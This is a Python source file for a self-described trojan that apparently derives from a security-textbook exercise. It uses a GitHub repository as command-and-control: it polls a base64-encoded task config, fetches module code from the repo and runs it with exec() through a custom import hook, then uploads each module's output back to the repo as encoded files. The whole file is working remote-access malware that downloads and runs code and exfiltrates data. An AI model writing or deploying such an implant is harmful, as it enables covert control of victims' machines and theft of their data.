



import json
import base64
import sys
import time
import importlib
import random
import threading
import queue
import os
import types
from github3 import login

# Configuration
trojan_id = "abc"
trojan_config = f"config/{trojan_id}.json"
data_path = f"data/{trojan_id}/"
trojan_modules = []
configured = False
task_queue = queue.Queue()

def connect_to_github():
    try:
        username = os.getenv('GITHUB_USERNAME')
        token = os.getenv('GITHUB_TOKEN')
        if not username or not token:
            raise ValueError("GitHub credentials not configured in environment variables")

        gh = login(username=username, token=token)
        repo = gh.repository(username, "Chapter-7")
        branch = repo.branch("master")

        return gh, repo, branch
    except Exception as e:
        print(f"[!] GitHub connection failed: {str(e)}")
        return None, None, None

def get_file_contents(filepath):
    try:
        gh, repo, branch = connect_to_github()
        if not all([gh, repo, branch]):
            return None

        sha = branch.commit.sha
        tree = repo.tree(sha=sha, recursive=True)

        for item in tree.tree:
            if filepath == item.path:
                print(f"[*] Found file {filepath}")
                blob = repo.blob(item.sha)
                return blob.content

        print(f"[!] File {filepath} not found in repository")
        return None
    except Exception as e:
        print(f"[!] Error in get_file_contents: {str(e)}")
        return None

def get_trojan_config():
    global configured
    try:
        config_json = get_file_contents(trojan_config)
        if not config_json:
            print("[!] No configuration file found")
            return None

        config = json.loads(base64.b64decode(config_json).decode('utf-8'))
        configured = True
        return config
    except Exception as e:
        print(f"[!] Error loading config: {str(e)}")
        return None

def store_module_result(data):
    try:
        if not data:
            print("[!] No data to store")
            return False

        gh, repo, branch = connect_to_github()
        if not all([gh, repo, branch]):
            return False

        filename = f"data/{trojan_id}/{random.randint(1000,100000)}.data"
        encoded_data = base64.b64encode(data.encode() if isinstance(data, str) else data)
        repo.create_file(filename, "Module execution result", encoded_data)
        return True
    except Exception as e:
        print(f"[!] Error storing results: {str(e)}")
        return False

class GitImporter(object):
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, fullname, path=None):
        if configured:
            print(f"[*] Attempting to retrieve {fullname}")
            new_library = get_file_contents(f"modules/{fullname}")
            if new_library:
                try:
                    self.current_module_code = base64.b64decode(new_library).decode('utf-8')
                    self.module_name = fullname.split('.')[-1]  # Normalize module name
                    return self
                except Exception as e:
                    print(f"[!] Failed to decode module {fullname}: {e}")
        return None

    def load_module(self, name):
        try:
            mod_name = getattr(self, 'module_name', name.split('.')[-1])
            module = types.ModuleType(mod_name)
            exec(self.current_module_code, module.__dict__)
            sys.modules[mod_name] = module
            print(f"[*] Successfully loaded module: {mod_name}")
            return module
        except Exception as e:
            print(f"[!] Error loading module {name}: {str(e)}")
            raise

def module_runner(module):
    try:
        task_queue.put(1)
        if module not in sys.modules:
            raise ImportError(f"Module {module} not available")
        result = sys.modules[module].run()
        if result:
            store_module_result(result)
    except Exception as e:
        print(f"[!] Module {module} execution failed: {str(e)}")
    finally:
        try:
            task_queue.get()
        except queue.Empty:
            pass

def main_loop():
    sys.meta_path = [GitImporter()]
    while True:
        try:
            if task_queue.empty():
                config = get_trojan_config()
                if not config:
                    print("[!] Waiting for valid configuration...")
                    time.sleep(300)
                    continue
                for task in config:
                    try:
                        if task['module'] not in sys.modules:
                            print(f"[!] Module {task['module']} not available")
                            continue
                        print(f"[*] Launching module: {task['module']}")
                        t = threading.Thread(target=module_runner, args=(task['module'],), daemon=True)
                        t.start()
                        time.sleep(1)
                    except Exception as e:
                        print(f"[!] Error starting module {task['module']}: {str(e)}")
                time.sleep(60)
            time.sleep(10)
        except KeyboardInterrupt:
            print("\n[!] Shutting down gracefully...")
            break
        except Exception as e:
            print(f"[!] Unexpected error: {str(e)}")
            time.sleep(300)

if __name__ == "__main__":
    print("[*] Starting trojan...")
    main_loop()
